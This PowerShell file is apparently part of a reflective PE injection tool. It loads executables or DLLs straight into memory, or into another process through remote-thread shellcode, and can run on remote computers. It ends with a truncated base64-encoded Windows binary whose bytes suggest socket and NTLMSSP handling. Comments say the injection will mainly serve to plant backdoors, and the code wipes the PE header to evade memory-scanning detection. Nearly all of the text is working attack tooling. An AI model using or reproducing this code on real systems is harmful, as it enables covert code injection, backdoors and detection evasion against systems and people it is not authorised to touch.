		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		
		#Get basic PE information
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}
		
		
		#Verify that the PE and the current process are the same bits (32bit or 64bit)
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			
			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		

		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
        #ASLR check
		[IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		if ((-not $ForceASLR) -and (-not $PESupportsASLR))
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		if ($RemoteLoading -eq $true)
		{
			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			#todo, error handling needs to delete this memory if an error happens along the way
			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		#Now that the PE is in memory, get more detailed information about it
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"
		
		
		#Copy each section from the PE in to memory
		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		#If a remote process to inject in to is specified, get a handle to it
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		

		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
		
		
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			#########################################
			### YOUR CODE GOES HERE
			#########################################
	        switch ($FuncReturnType)
	        {
	            'WString' {
	                Write-Verbose "Calling function with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				    Write-Output $Output
	            }

	            'String' {
	                Write-Verbose "Calling function with String return type"
				    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
				    if ($StringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
				    [IntPtr]$OutputPtr = $StringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				    Write-Output $Output
	            }

	            'Void' {
	                Write-Verbose "Calling function with Void return type"
				    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
				    if ($VoidFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $VoidFuncDelegate = Get-DelegateType @() ([Void])
				    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
				    $VoidFunc.Invoke() | Out-Null
	            }
	        }
			#########################################
			### END OF YOUR CODE
			#########################################
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Delete the PE file from memory.
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	#Verify the image is a valid PE file
	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

	if (-not $DoNotZeroMZ) {
		# Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
		# TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
		$PEBytes[0] = 0
		$PEBytes[1] = 0
	}
	
	#Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = "ReflectiveExe $ExeArgs"
	}
	else
	{
		$ExeArgs = "ReflectiveExe"
	}

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
	}
}

Main
}
$PEBytes64 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABJjI9yDe3hIQ3t4SEN7eEhGYbiIAjt4SEZhuQgg+3hIdSZ5CAh7eEh1JnlIB3t4SHUmeIgBO3hIRmG5SAD7eEhGYbgIAbt4SEN7eAhd+3hIdaZ6CAI7eEh1pkeIQzt4SHWmeMgDO3hIVJpY2gN7eEhAAAAAAAAAABQRQAAZIYHAPR3/mAAAAAAAAAAAPAAIgALAg4cAK4BAAAwAQAAAAAA0DoAAAAQAAAAAABAAQAAAAAQAAAAAgAABgAAAAAAAAAGAAAAAAAAAAAgAwAABAAAAAAAAAMAYIEAABAAAAAAAAAQAAAAAAAAAAAQAAAAAAAAEAAAAAAAAAAAAAAQAAAAAAAAAAAAAAD0mgIAeAAAAAAAAwDgAQAAANACADwYAAAAAAAAAAAAAAAQAwBcCAAAJHgCADgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgeAIAOAEAAAAAAAAAAAAAAMABAIgDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAudGV4dAAAAMCsAQAAEAAAAK4BAAAEAAAAAAAAAAAAAAAAAAAgAABgLnJkYXRhAABU5gAAAMABAADoAAAAsgEAAAAAAAAAAAAAAAAAQAAAQC5kYXRhAAAA0B8AAACwAgAADgAAAJoCAAAAAAAAAAAAAAAAAEAAAMAucGRhdGEAADwYAAAA0AIAABoAAACoAgAAAAAAAAAAAAAAAABAAABAX1JEQVRBAAD8AAAAAPACAAACAAAAwgIAAAAAAAAAAAAAAAAAQAAAQC5yc3JjAAAA4AEAAAAAAwAAAgAAAMQCAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAFwIAAAAEAMAAAoAAADGAgAAAAAAAAAAAAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiNBYm/AgDDzMzMzMzMzMxIiUwkCEiJVCQQTIlEJBhMiUwkIFNWV0iD7DBIi/lIjXQkWLkBAAAA6BOJAABIi9jou////0UzyUiJdCQgTIvHSIvTSIsI6IHMAABIg8QwX15bw8zMzMzMzMzMzMzMzMxIiUwkCEiJVCQQTIlEJBhMiUwkIFNWV0iD7DBIi/lIjXQkWLkBAAAA6LOIAABIi9joW////0UzyUiJdCQgTIvHSIvTSIsI6JXLAABIg8QwX15bw8zMzMzMzMzMzMzMzMxIiVQkEEyJRCQYTIlMJCBTVldIg+wwSIvaSI10JGBIi/noCv///0yLy0iJdCQoSMfD/////0jHRCQgAAAAAEyLw0iL10iLCEiDyQHoSMwAAIXAD0jDSIPEMF9eW8PMzMxAVVNWV0FUQVVBVkFXSI2sJIg///+4eMEAAOhBogEASCvgSIsFr54CAEgzxEiJhWDAAABJi9lIiUwkOEiL8UiJXCQgSIuN4MAAAEUz5ESJZCRATYvwTIlEJDBIi/ro/gYAALkCAgAASIlEJChIjZVgQAAARTP//xU8sQEAQY1MJAKFwHQYi9BIjQ0CUAIA6E3+//9FjWwkAekfAQAAugEAAABEjUIF/xUksQEATIvoSIP4/3Ul/xU9sQEAi9BIjQ0sUAIA6Bf+////FfmwAQBBvQEAAADp4gAAADPASI1MJFhIi9dIiUQkWIlEJGBEjUAM6PrPAAAzwEiNTCRoD1fAiUQkeEiL1g8RRCRoRI1AFOjbzwAASI1MJFjoSdoAAIvYSI1MJGi4AgAAAGaJRCRI/xWKsAEAD7fLiUQkTP8VpbABAEG4EAAAAEiNVCRISYvNZolEJEr/FXywAQCD+P91RP8VkbABAIvQSI0N0E8CAOhr/f//SYvN/xUisAEAg/j/dRT/FW+wAQCL0EiNDQ5QAgDoSf3///8VK7ABAEG9AQAAAOsSTIvHSI0NgVACAEiL1uiJ/f//SItcJCDHRCRYTlRMTWbHRCRcU1PGRCReUEiLTCQoSI1VYEUzyUG4ACAAAP8V+K8BAEhj8EWF5A+F